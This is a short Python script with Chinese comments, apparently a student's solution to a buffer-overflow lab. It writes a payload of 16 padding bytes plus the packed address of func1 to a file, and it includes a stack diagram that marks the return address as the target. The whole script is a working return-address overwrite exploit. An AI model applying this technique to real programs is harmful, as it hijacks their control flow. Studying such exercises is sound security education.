import struct #为了方便把整数地址转换成字节串
padding=b'A'*16 #8字节用于缓冲区+8字节用于保存的rbp
func1=0x401216 #func1的地址：0x401216
addrb=struct.pack('<Q',func1) #需要把它变成内存原始的8个字节 '<'代表小端序 '<Q'代表8字节无符号整数 'struct.pack'函数把整数变成字节串
payload=padding+addrb
with open('ans1.txt','wb') as f:
    f.write(payload)
print("Payload written to ans1.txt")
#高地址 (High Address)
#--------------------
#|   Return Address |<---攻击目标(8字节)
#--------------------
#|     ole RBP      |<---之前的旧RBP(8字节)
#--------------------
#|     buffer       |<---写入数据的起始位置
#|                  |
#-------------------
#低地址 (Low Address)